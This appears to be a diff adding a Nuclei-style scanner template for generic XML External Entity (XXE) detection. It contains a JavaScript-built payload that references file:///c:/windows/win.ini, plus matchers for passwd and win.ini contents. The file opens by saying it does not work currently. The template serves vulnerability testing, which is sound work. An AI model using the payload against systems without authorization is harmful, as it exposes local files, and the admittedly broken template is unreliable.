@@ -1,0 +1,69 @@
+# Doesnt work currently
+id: generic-xxe
+
+info:
+  name: Generic XML External Entity - (XXE)
+  author: pwnhxl,AmirHossein Raeisi
+  severity: medium
+  reference:
+    - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
+  metadata:
+    max-request: 2
+  tags: dast,xxe
+
+variables:
+  rletter: "{{rand_base(6,'abc')}}"
+
+http:
+  - raw:
+      - |
+        POST /path HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: {{ContentLength}}
+
+        {{Body}}
+
+    extractors:
+      - type: regex
+        name: param_names
+        part: body
+        regex:
+          - '(\w+)=.*?'
+
+    payloads:
+      - name: xxe_payload
+        type: javascript
+        script: |
+          var paramNames = {{param_names}};
+          var rletter = "{{rletter}}";
+          var payload = '<!DOCTYPE ' + rletter + ' [ <!ENTITY ' + rletter + ' SYSTEM "file:///c:/windows/win.ini"> ]>';
+          paramNames.forEach(function(param) {
+            payload += '<' + param + '>&' + rletter + ';</' + param + '>';
+          });
+          payload;
+
+    fuzzing:
+      - part: body
+        type: replace
+        fuzz:
+          - "{{xxe_payload}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        name: linux
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        name: windows
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
